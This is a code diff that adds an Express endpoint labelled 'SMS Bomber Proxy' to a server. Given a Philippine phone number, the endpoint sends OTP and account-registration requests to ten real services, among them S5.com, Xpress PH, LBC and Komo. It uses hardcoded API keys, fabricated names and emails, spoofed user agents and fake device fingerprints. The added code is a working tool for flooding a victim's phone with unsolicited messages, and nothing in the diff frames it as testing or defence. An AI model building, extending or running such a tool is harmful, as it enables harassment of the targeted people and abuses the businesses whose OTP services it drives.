@@ -124,6 +124,143 @@ async function startServer() {
     }
   });
 
+  // SMS Bomber Proxy
+  app.post("/api/sms/bomb", async (req, res) => {
+    const { phoneNumber, service } = req.body;
+    const formattedNum = phoneNumber.startsWith('0') ? phoneNumber.replace('0', '+63') : `+63${phoneNumber}`;
+    const rawNum = phoneNumber.startsWith('0') ? phoneNumber.substring(1) : phoneNumber;
+    const cleanNum = phoneNumber.startsWith('0') ? phoneNumber : `0${phoneNumber}`;
+
+    const randomStr = (len: number) => Math.random().toString(36).substring(2, 2 + len);
+
+    try {
+      let response;
+      switch (service) {
+        case "S5.com": {
+          const boundary = "----WebKitFormBoundary" + randomStr(16);
+          const data = `--${boundary}\r\nContent-Disposition: form-data; name="phone_number"\r\n\r\n${formattedNum}\r\n--${boundary}--\r\n`;
+          response = await axios.post('https://api.s5.com/player/api/v1/otp/request', data, {
+            headers: {
+              'content-type': `multipart/form-data; boundary=${boundary}`,
+              'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
+              'x-public-api-key': 'd6a6d988-e73e-4402-8e52-6df554cbfb35',
+            }
+          });
+          break;
+        }
+        case "Xpress PH": {
+          response = await axios.post("https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp", {
+            "FirstName": "toshi",
+            "LastName": "premium",
+            "Email": `toshi${Date.now()}@gmail.com`,
+            "Phone": formattedNum,
+            "Password": "ToshiPass123",
+            "ConfirmPassword": "ToshiPass123",
+            "ImageUrl": "",
+            "RoleIds": [4],
+            "Area": "manila",
+            "City": "manila",
+            "PostalCode": "1000",
+            "Street": "toshi_street",
+            "ReferralCode": "",
+            "FingerprintVisitorId": "TPt0yCuOFim3N3rzvrL1",
+            "FingerprintRequestId": "1757149666261.Rr1VvG",
+          }, {
+            headers: { "User-Agent": "Dalvik/35 (Linux; U; Android 15; 2207117BPG Build/AP3A.240905.015.A2)/Dart" }
+          });
+          break;
+        }
+        case "Abenson": {
+          response = await axios.post('https://api.mobile.abenson.com/api/public/membership/activate_otp', 
+            `contact_no=${cleanNum}&login_token=undefined`, 
+            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
+          );
+          break;
+        }
+        case "Excellente Lending": {
+          response = await axios.post('https://api.excellenteralending.com/dllin/union/rehabilitation/dock', {
+            "domain": cleanNum,
+            "cat": "login",
+            "previous": false,
+            "financial": "efe35521e51f924efcad5d61d61072a9"
+          }, {
+            headers: { 'x-package-name': 'com.support.excellenteralending' }
+          });
+          break;
+        }
+        case "FortunePay": {
+          response = await axios.post('https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register', {
+            "deviceId": 'c31a9bc0-652d-11f0-88cf-9d4076456969',
+            "deviceType": 'GOOGLE_PLAY',
+            "companyId": '4bf735e97269421a80b82359e7dc2288',
+            "dialCode": '+63',
+            "phoneNumber": rawNum
+          });
+          break;
+        }
+        case "WeMove": {
+          response = await axios.post('https://api.wemove.com.ph/auth/users', {
+            "phone_country": '+63',
+            "phone_no": rawNum
+          });
+          break;
+        }
+        case "LBC": {
+          response = await axios.post('https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification', 
+            new URLSearchParams({
+              'verification_type': 'mobile',
+              'client_email': `${randomStr(8)}@gmail.com`,
+              'client_contact_code': '+63',
+              'client_contact_no': rawNum,
+              'app_log_uid': randomStr(16),
+              'app_platform': 'Android',
+              'device_name': 'rosemary_p_global',
+              'app_version': '3.0.67',
+              'app_hash': randomStr(32),
+            }).toString(),
+            { headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'api': 'LBC', 'token': 'CONNECT' } }
+          );
+          break;
+        }
+        case "Pickup Coffee": {
+          response = await axios.post('https://production.api.pickup-coffee.net/v2/customers/login', {
+            "mobile_number": formattedNum,
+            "login_method": 'mobile_number'
+          }, {
+            headers: { 'x-env': 'Production', 'x-app-version': '2.7.0' }
+          });
+          break;
+        }
+        case "HoneyLoan": {
+          response = await axios.post('https://api.honeyloan.ph/api/client/registration/step-one', {
+            "phone": cleanNum,
+            "is_rights_block_accepted": 1
+          });
+          break;
+        }
+        case "Komo": {
+          response = await axios.post('https://api.komo.ph/api/otp/v5/generate', {
+            "mobile": cleanNum,
+            "transactionType": 6
+          }, {
+            headers: { 'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba' }
+          });
+          break;
+        }
+        default:
+          return res.status(400).json({ error: "Unknown service" });
+      }
+      res.json({ success: true, status: response.status });
+    } catch (error: any) {
+      console.error(`SMS Bomb Error (${service}):`, error.message);
+      res.status(error.response?.status || 500).json({ 
+        success: false, 
+        error: error.message,
+        details: error.response?.data 
+      });
+    }
+  });
+
   // Vite middleware for development
   if (process.env.NODE_ENV !== "production") {
     const vite = await createViteServer({
